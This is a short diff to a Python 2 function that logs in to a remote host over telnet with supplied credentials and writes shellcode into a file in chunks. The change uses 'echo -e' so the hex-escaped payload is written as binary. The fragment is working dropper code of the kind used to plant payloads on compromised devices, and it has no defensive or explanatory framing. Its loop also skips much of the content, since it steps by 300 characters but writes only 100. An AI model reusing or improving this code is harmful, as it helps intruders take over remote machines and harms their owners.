@@ -44,9 +44,9 @@ def try_telnet_send(host, port, username, password, shellcode, location, timeout
         for a in xrange(0, len(content), 300):
             print "sent split"
             print str(a)+"/"+str(len(content))
-            command = 'echo  "'+content[a:a+100]+'" >> '+ location +'\n\n'
+            command = 'echo -e "'+content[a:a+100]+'" >> '+ location +'\n\n'
             hlr.write(command)
-            time.sleep(1)
+            time.sleep(0.3)
         print "wrote hex"
         hlr.close()
         return True
